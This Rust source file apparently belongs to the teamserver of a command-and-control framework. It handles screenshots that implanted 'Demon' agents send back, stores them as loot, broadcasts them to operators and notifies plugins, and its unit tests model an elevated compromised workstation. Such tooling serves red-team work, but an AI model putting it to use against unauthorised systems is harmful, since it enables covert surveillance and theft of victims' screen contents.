use std::collections::BTreeMap;

use base64::Engine as _;
use base64::engine::general_purpose::STANDARD as BASE64_STANDARD;
use red_cell_common::demon::DemonCommand;
use serde_json::Value;
use time::OffsetDateTime;
use time::format_description::well_known::Rfc3339;
use tracing::warn;

use crate::{AgentRegistry, Database, EventBus, LootRecord, PluginRuntime};

use super::{
    CallbackParser, CommandDispatchError, agent_response_event, agent_response_event_with_extra,
    insert_loot_record, loot_context, loot_new_event, metadata_with_context,
};

pub(super) async fn handle_screenshot_callback(
    registry: &AgentRegistry,
    database: &Database,
    events: &EventBus,
    plugins: Option<&PluginRuntime>,
    agent_id: u32,
    request_id: u32,
    payload: &[u8],
) -> Result<Option<Vec<u8>>, CommandDispatchError> {
    let mut parser = CallbackParser::new(payload, u32::from(DemonCommand::CommandScreenshot));
    let success = parser.read_u32("screenshot success")?;
    let context = loot_context(registry, agent_id, request_id).await;

    if success == 0 {
        events.broadcast(agent_response_event(
            agent_id,
            u32::from(DemonCommand::CommandScreenshot),
            request_id,
            "Error",
            "Failed to take a screenshot",
            None,
        )?);
        return Ok(None);
    }

    let bytes = parser.read_bytes("screenshot bytes")?;
    if bytes.is_empty() {
        events.broadcast(agent_response_event(
            agent_id,
            u32::from(DemonCommand::CommandScreenshot),
            request_id,
            "Error",
            "Failed to take a screenshot",
            None,
        )?);
        return Ok(None);
    }

    let timestamp = OffsetDateTime::now_utc();
    let captured_at = timestamp.format(&Rfc3339)?;
    let name = timestamp
        .format(
            &time::format_description::parse(
                "Desktop_[day].[month].[year]-[hour].[minute].[second].png",
            )
            .map_err(|error| CommandDispatchError::InvalidCallbackPayload {
                command_id: u32::from(DemonCommand::CommandScreenshot),
                message: error.to_string(),
            })?,
        )
        .map_err(CommandDispatchError::Timestamp)?;

    let record = insert_loot_record(
        database,
        LootRecord {
            id: None,
            agent_id,
            kind: "screenshot".to_owned(),
            name: name.clone(),
            file_path: None,
            size_bytes: Some(i64::try_from(bytes.len()).unwrap_or(i64::MAX)),
            captured_at: captured_at.clone(),
            data: Some(bytes.clone()),
            metadata: Some(metadata_with_context(
                [
                    ("request_id".to_owned(), Value::String(format!("{request_id:X}"))),
                    ("captured_at".to_owned(), Value::String(captured_at.clone())),
                ]
                .into_iter(),
                &context,
                request_id,
            )),
        },
    )
    .await?;

    events.broadcast(loot_new_event(
        &record,
        u32::from(DemonCommand::CommandScreenshot),
        request_id,
        &context,
    )?);

    if let Some(plugins) = plugins
        && let Err(error) = plugins.emit_loot_captured(&record).await
    {
        warn!(agent_id = format_args!("{agent_id:08X}"), %error, "failed to emit python loot_captured event");
    }

    events.broadcast(agent_response_event_with_extra(
        agent_id,
        u32::from(DemonCommand::CommandScreenshot),
        request_id,
        "Good",
        "Successful took screenshot",
        BTreeMap::from([
            ("MiscType".to_owned(), Value::String("screenshot".to_owned())),
            ("MiscData".to_owned(), Value::String(BASE64_STANDARD.encode(&bytes))),
            ("MiscData2".to_owned(), Value::String(name)),
        ]),
        String::new(),
    )?);
    Ok(None)
}

#[cfg(test)]
mod tests {
    use base64::Engine as _;
    use base64::engine::general_purpose::STANDARD as BASE64_STANDARD;
    use red_cell_common::operator::OperatorMessage;
    use serde_json::Value;
    use zeroize::Zeroizing;

    use super::*;
    use crate::{AgentRegistry, Database, EventBus};

    const AGENT_ID: u32 = 0xABCD_0001;
    const REQUEST_ID: u32 = 0x42;

    fn push_u32(buf: &mut Vec<u8>, value: u32) {
        buf.extend_from_slice(&value.to_le_bytes());
    }

    fn sample_agent() -> red_cell_common::AgentRecord {
        red_cell_common::AgentRecord {
            agent_id: AGENT_ID,
            active: true,
            reason: String::new(),
            note: String::new(),
            encryption: red_cell_common::AgentEncryptionInfo {
                aes_key: Zeroizing::new(vec![0u8; 32]),
                aes_iv: Zeroizing::new(vec![0u8; 16]),
                monotonic_ctr: false,
            },
            hostname: "wkstn-01".to_owned(),
            username: "operator".to_owned(),
            domain_name: "lab".to_owned(),
            external_ip: "127.0.0.1".to_owned(),
            internal_ip: "10.0.0.25".to_owned(),
            process_name: "explorer.exe".to_owned(),
            process_path: "C:\\Windows\\explorer.exe".to_owned(),
            base_address: 0x1000,
            process_pid: 1337,
            process_tid: 7331,
            process_ppid: 512,
            process_arch: "x64".to_owned(),
            elevated: true,
            os_version: "Windows 11".to_owned(),
            os_build: 0,
            os_arch: "x64".to_owned(),
            sleep_delay: 10,
            sleep_jitter: 25,
            kill_date: None,
            working_hours: None,
            first_call_in: "2026-03-09T20:00:00Z".to_owned(),
            last_call_in: "2026-03-09T20:00:00Z".to_owned(),
            archon_magic: None,
        }
    }

    /// Build registry, database, and event bus with a pre-registered sample agent.
    async fn setup() -> (AgentRegistry, Database, EventBus) {
        let db = Database::connect_in_memory().await.expect("in-memory db must succeed");
        let registry = AgentRegistry::new(db.clone());
        let events = EventBus::new(16);
        registry.insert(sample_agent()).await.expect("insert sample agent");
        (registry, db, events)
    }

    /// Build a payload with `success=1` and the given image bytes.
    fn success_payload(image_bytes: &[u8]) -> Vec<u8> {
        let mut buf = Vec::new();
        push_u32(&mut buf, 1); // success = 1
        push_u32(&mut buf, image_bytes.len() as u32);
        buf.extend_from_slice(image_bytes);
        buf
    }

    /// Build a payload with `success=0`.
    fn failure_payload() -> Vec<u8> {
        0_u32.to_le_bytes().to_vec()
    }

    /// Build a payload with `success=1` but zero-length bytes.
    fn empty_bytes_payload() -> Vec<u8> {
        let mut buf = Vec::new();
        push_u32(&mut buf, 1); // success = 1
        push_u32(&mut buf, 0); // length = 0
        buf
    }

    /// Success path: stores loot and broadcasts loot-new + screenshot events.
    #[tokio::test]
    async fn success_stores_loot_and_broadcasts_two_events() {
        let (registry, db, events) = setup().await;
        let mut rx = events.subscribe();

        let png = vec![0x89, b'P', b'N', b'G', 0x0D, 0x0A, 0x1A, 0x0A];
        let payload = success_payload(&png);

        let result = handle_screenshot_callback(
            &registry, &db, &events, None, AGENT_ID, REQUEST_ID, &payload,
        )
        .await;
        assert!(result.is_ok());
        assert_eq!(result.expect("unwrap"), None);

        // First broadcast: loot-new event.
        let msg1 = rx.recv().await.expect("should receive loot-new event");
        let OperatorMessage::AgentResponse(loot_resp) = &msg1 else {
            panic!("expected AgentResponse (loot-new), got {msg1:?}");
        };
        assert_eq!(loot_resp.info.extra.get("MiscType").and_then(Value::as_str), Some("loot-new"),);
        assert_eq!(loot_resp.info.demon_id, format!("{AGENT_ID:08X}"));

        // Second broadcast: screenshot download-complete response.
        let msg2 = rx.recv().await.expect("should receive screenshot response");
        let OperatorMessage::AgentResponse(resp) = &msg2 else {
            panic!("expected AgentResponse (screenshot), got {msg2:?}");
        };
        assert_eq!(resp.info.extra.get("Type").and_then(Value::as_str), Some("Good"),);
        assert_eq!(resp.info.extra.get("MiscType").and_then(Value::as_str), Some("screenshot"),);

        // Verify base64-encoded MiscData round-trips to original bytes.
        let misc_data = resp.info.extra.get("MiscData").and_then(Value::as_str).expect("unwrap");
        let decoded = BASE64_STANDARD.decode(misc_data).expect("valid base64");
        assert_eq!(decoded, png);

        // Verify MiscData2 is a Desktop_*.png filename.
        let misc_data2 = resp.info.extra.get("MiscData2").and_then(Value::as_str).expect("unwrap");
        assert!(
            misc_data2.starts_with("Desktop_") && misc_data2.ends_with(".png"),
            "expected Desktop_*.png filename, got {misc_data2}"
        );

        // Verify loot record persisted in the database.
        let loot_records = db.loot().list_for_agent(AGENT_ID).await.expect("loot query");
        assert_eq!(loot_records.len(), 1);
        assert_eq!(loot_records[0].kind, "screenshot");
        assert_eq!(loot_records[0].agent_id, AGENT_ID);
        assert_eq!(loot_records[0].data.as_deref(), Some(png.as_slice()));
        assert_eq!(loot_records[0].name, misc_data2);
    }

    /// Failure path (success=0): broadcasts error, stores no loot.
    #[tokio::test]
    async fn failure_broadcasts_error_and_stores_no_loot() {
        let (registry, db, events) = setup().await;
        let mut rx = events.subscribe();

        let payload = failure_payload();

        let result = handle_screenshot_callback(
            &registry, &db, &events, None, AGENT_ID, REQUEST_ID, &payload,
        )
        .await;
        assert!(result.is_ok());
        assert_eq!(result.expect("unwrap"), None);

        // Should receive exactly one error broadcast.
        let msg = rx.recv().await.expect("should receive error event");
        let OperatorMessage::AgentResponse(resp) = &msg else {
            panic!("expected AgentResponse, got {msg:?}");
        };
        assert_eq!(resp.info.extra.get("Type").and_then(Value::as_str), Some("Error"),);

        // No loot record should be stored.
        let loot_records = db.loot().list_for_agent(AGENT_ID).await.expect("loot query");
        assert!(loot_records.is_empty());
    }

    /// Empty bytes path (success=1, length=0): broadcasts error, stores no loot.
    #[tokio::test]
    async fn empty_bytes_broadcasts_error_and_stores_no_loot() {
        let (registry, db, events) = setup().await;
        let mut rx = events.subscribe();

        let payload = empty_bytes_payload();

        let result = handle_screenshot_callback(
            &registry, &db, &events, None, AGENT_ID, REQUEST_ID, &payload,
        )
        .await;
        assert!(result.is_ok());
        assert_eq!(result.expect("unwrap"), None);

        // Should receive exactly one error broadcast.
        let msg = rx.recv().await.expect("should receive error event");
        let OperatorMessage::AgentResponse(resp) = &msg else {
            panic!("expected AgentResponse, got {msg:?}");
        };
        assert_eq!(resp.info.extra.get("Type").and_then(Value::as_str), Some("Error"),);

        // No loot record should be stored.
        let loot_records = db.loot().list_for_agent(AGENT_ID).await.expect("loot query");
        assert!(loot_records.is_empty());
    }

    /// Truncated payload (no success field) returns a parse error.
    #[tokio::test]
    async fn truncated_payload_returns_error() {
        let (registry, db, events) = setup().await;

        // Empty payload — cannot even read the success u32.
        let result =
            handle_screenshot_callback(&registry, &db, &events, None, AGENT_ID, REQUEST_ID, &[])
                .await;
        assert!(result.is_err());
    }

    /// Truncated payload after success=1 (no bytes field) returns a parse error.
    #[tokio::test]
    async fn truncated_after_success_flag_returns_error() {
        let (registry, db, events) = setup().await;

        // success=1 but no subsequent length-prefixed bytes.
        let payload = 1_u32.to_le_bytes().to_vec();

        let result = handle_screenshot_callback(
            &registry, &db, &events, None, AGENT_ID, REQUEST_ID, &payload,
        )
        .await;
        assert!(result.is_err());

        // No loot should be stored.
        let loot_records = db.loot().list_for_agent(AGENT_ID).await.expect("loot query");
        assert!(loot_records.is_empty());
    }

    // ── Plugin emission path tests ──────────────────────────────────────────

    /// Happy path with plugin: screenshot succeeds, `emit_loot_captured` is
    /// called, and loot is still stored.
    #[allow(clippy::await_holding_lock)]
    #[tokio::test(flavor = "multi_thread")]
    async fn success_with_plugin_invokes_emit_loot_captured() {
        use crate::{
            PluginEvent, PluginRuntime, SocketRelayManager, plugins::PLUGIN_RUNTIME_TEST_MUTEX,
        };
        use pyo3::prelude::*;
        use pyo3::types::{PyDict, PyList};

        let _guard = PLUGIN_RUNTIME_TEST_MUTEX.lock().unwrap_or_else(|p| p.into_inner());

        let (registry, db, events) = setup().await;
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let runtime =
            PluginRuntime::initialize(db.clone(), registry.clone(), events.clone(), sockets, None)
                .await
                .expect("plugin runtime init");

        // Create a Python callback that tracks invocations.
        let (tracker, callback) = tokio::task::spawn_blocking({
            let runtime = runtime.clone();
            move || {
                Python::with_gil(|py| -> PyResult<(Py<PyList>, Py<PyAny>)> {
                    runtime.install_api_module_for_test(py)?;
                    let tracker = PyList::empty(py);
                    let locals = PyDict::new(py);
                    locals.set_item("_tracker", tracker.clone())?;
                    let cb = py.eval(
                        pyo3::ffi::c_str!(
                            "(lambda t: lambda event: t.append(event.data['kind']))(_tracker)"
                        ),
                        None,
                        Some(&locals),
                    )?;
                    Ok((tracker.unbind(), cb.unbind()))
                })
            }
        })
        .await
        .expect("spawn_blocking")
        .expect("python setup");

        runtime
            .register_callback_for_test(PluginEvent::LootCaptured, callback)
            .await
            .expect("register callback");

        let mut rx = events.subscribe();
        let png = vec![0x89, b'P', b'N', b'G', 0x0D, 0x0A, 0x1A, 0x0A];
        let payload = success_payload(&png);

        let result = handle_screenshot_callback(
            &registry,
            &db,
            &events,
            Some(&runtime),
            AGENT_ID,
            REQUEST_ID,
            &payload,
        )
        .await;
        assert!(result.is_ok());
        assert_eq!(result.expect("unwrap"), None);

        // Drain the two expected broadcasts (loot-new + screenshot response).
        let _msg1 = rx.recv().await.expect("loot-new event");
        let _msg2 = rx.recv().await.expect("screenshot response");

        // Verify loot is persisted.
        let loot_records = db.loot().list_for_agent(AGENT_ID).await.expect("loot query");
        assert_eq!(loot_records.len(), 1);
        assert_eq!(loot_records[0].kind, "screenshot");

        // Verify the plugin callback was invoked exactly once with kind="screenshot".
        let (count, kind) = tokio::task::spawn_blocking(move || {
            Python::with_gil(|py| -> PyResult<(usize, String)> {
                let list = tracker.bind(py);
                let count = list.len();
                let first = list.get_item(0)?.extract::<String>()?;
                Ok((count, first))
            })
        })
        .await
        .expect("spawn_blocking")
        .expect("tracker read");
        assert_eq!(count, 1, "callback should be invoked exactly once");
        assert_eq!(kind, "screenshot");
    }

    /// Plugin error is suppressed: `emit_loot_captured` returns an error, but
    /// the handler still returns `Ok(None)` and the loot record persists.
    #[tokio::test]
    async fn plugin_emit_error_is_suppressed_and_loot_persists() {
        use crate::{PluginRuntime, SocketRelayManager};

        let (registry, db, events) = setup().await;
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let runtime =
            PluginRuntime::stub_failing(db.clone(), registry.clone(), events.clone(), sockets);

        let mut rx = events.subscribe();
        let png = vec![0x89, b'P', b'N', b'G', 0x0D, 0x0A, 0x1A, 0x0A];
        let payload = success_payload(&png);

        let result = handle_screenshot_callback(
            &registry,
            &db,
            &events,
            Some(&runtime),
            AGENT_ID,
            REQUEST_ID,
            &payload,
        )
        .await;

        // Must still succeed despite plugin error.
        assert!(result.is_ok());
        assert_eq!(result.expect("unwrap"), None);

        // Drain expected broadcasts.
        let _msg1 = rx.recv().await.expect("loot-new event");
        let _msg2 = rx.recv().await.expect("screenshot response");

        // Loot must still be persisted.
        let loot_records = db.loot().list_for_agent(AGENT_ID).await.expect("loot query");
        assert_eq!(loot_records.len(), 1);
        assert_eq!(loot_records[0].kind, "screenshot");
        assert_eq!(loot_records[0].data.as_deref(), Some(png.as_slice()));
    }

    /// Failure path (success=0) does NOT invoke the plugin at all.
    #[allow(clippy::await_holding_lock)]
    #[tokio::test(flavor = "multi_thread")]
    async fn failure_path_does_not_invoke_plugin() {
        use crate::{
            PluginEvent, PluginRuntime, SocketRelayManager, plugins::PLUGIN_RUNTIME_TEST_MUTEX,
        };
        use pyo3::prelude::*;
        use pyo3::types::{PyDict, PyList};

        let _guard = PLUGIN_RUNTIME_TEST_MUTEX.lock().unwrap_or_else(|p| p.into_inner());

        let (registry, db, events) = setup().await;
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let runtime =
            PluginRuntime::initialize(db.clone(), registry.clone(), events.clone(), sockets, None)
                .await
                .expect("plugin runtime init");

        let (tracker, callback) = tokio::task::spawn_blocking({
            let runtime = runtime.clone();
            move || {
                Python::with_gil(|py| -> PyResult<(Py<PyList>, Py<PyAny>)> {
                    runtime.install_api_module_for_test(py)?;
                    let tracker = PyList::empty(py);
                    let locals = PyDict::new(py);
                    locals.set_item("_tracker", tracker.clone())?;
                    let cb = py.eval(
                        pyo3::ffi::c_str!(
                            "(lambda t: lambda event: t.append(event.data['kind']))(_tracker)"
                        ),
                        None,
                        Some(&locals),
                    )?;
                    Ok((tracker.unbind(), cb.unbind()))
                })
            }
        })
        .await
        .expect("spawn_blocking")
        .expect("python setup");

        runtime
            .register_callback_for_test(PluginEvent::LootCaptured, callback)
            .await
            .expect("register callback");

        let payload = failure_payload();
        let result = handle_screenshot_callback(
            &registry,
            &db,
            &events,
            Some(&runtime),
            AGENT_ID,
            REQUEST_ID,
            &payload,
        )
        .await;
        assert!(result.is_ok());

        // No loot should be stored.
        let loot_records = db.loot().list_for_agent(AGENT_ID).await.expect("loot query");
        assert!(loot_records.is_empty());

        // Verify the plugin callback was NOT invoked.
        let count =
            tokio::task::spawn_blocking(move || Python::with_gil(|py| tracker.bind(py).len()))
                .await
                .expect("spawn_blocking");
        assert_eq!(count, 0, "plugin must not be invoked on failure path");
    }
}
